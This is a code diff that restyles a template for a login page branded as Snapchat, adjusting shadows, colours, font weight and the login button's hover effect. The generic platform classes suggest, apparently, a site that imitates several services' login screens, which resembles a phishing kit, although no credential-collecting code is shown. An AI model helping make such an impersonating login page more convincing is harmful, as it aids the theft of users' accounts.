@@ -1,12 +1,12 @@
 {% extends "base.html" %}
 {% block body %}
-<div class="card" style="max-width:520px;margin:28px auto">
+<div class="card" style="max-width:520px;margin:28px auto;box-shadow:0 6px 18px rgba(255,252,0,0.25);border-radius:16px;">
   <div class="platform-header">
     <div class="icon-circle bg-snapchat">
       <i class="fa-brands fa-snapchat icon-lg"></i>
     </div>
     <div>
-      <h2 class="notranslate" style="margin:0;color:#FFFC00;">Snapchat</h2>
+      <h2 class="notranslate" style="margin:0;color:#000;">Snapchat</h2>
       <div style="color:#64748b;font-size:13px">Please login to continue</div>
     </div>
   </div>
@@ -53,7 +53,7 @@
   background: #FFFC00;
   color: #000;
   font-size: 16px;
-  font-weight: 600;
+  font-weight: 700; /* bold black text */
   padding: 12px;
   border-radius: 25px;
   cursor: pointer;
@@ -65,6 +65,7 @@
 }
 .login-btn:hover {
   background: #f4f000;
+  box-shadow: 0 8px 20px rgba(255, 252, 0, 0.45);
 }
 .login-btn:active {
   transform: scale(0.985);
